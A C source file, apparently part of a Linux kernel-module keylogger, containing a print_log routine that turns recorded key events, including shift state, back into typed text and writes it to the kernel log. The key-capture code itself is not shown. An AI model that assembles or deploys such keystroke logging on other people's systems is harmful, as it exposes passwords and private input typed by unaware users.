#include "./keyboard.h"

extern t_key	*first;

static int	print_clear_buff(char buff[])
{
	pr_info("%s", buff);
	memset(buff, 0, BUFF_SIZE);
	return 0;
}

void	print_log(void)
{
	t_key	*tmp = first;
	char	buff[BUFF_SIZE] = {0};
	size_t	idx = 0;
	char	shift = 0;

	pr_info("Full log :\n");

	while (tmp != NULL) {
		// check if shift is pressed
		if (tmp->key == 42)
			shift = tmp->state;
		// check if key is mapped, pressed and writable
		if (keyboard_map[MIN][tmp->key] && tmp->state && tmp->key <= 57) {
			if (keyboard_map[MIN][tmp->key] != '\n') { // if key isn't ENTER
				// if buffer is full print log and clear buffer
				if (idx == BUFF_SIZE - 1)
					idx = print_clear_buff(buff);
				// store key in buffer
				if (shift == 0) buff[idx] = keyboard_map[MIN][tmp->key];
 				else buff[idx] = keyboard_map[MAJ][tmp->key];
				idx++;
			}
			// Print buffer when ENTER is pressed
			else
				idx = print_clear_buff(buff);
		}
		tmp = tmp->next;
	}
	// print buffer if last key isn't ENTER
	if (strlen(buff))
		print_clear_buff(buff);
}

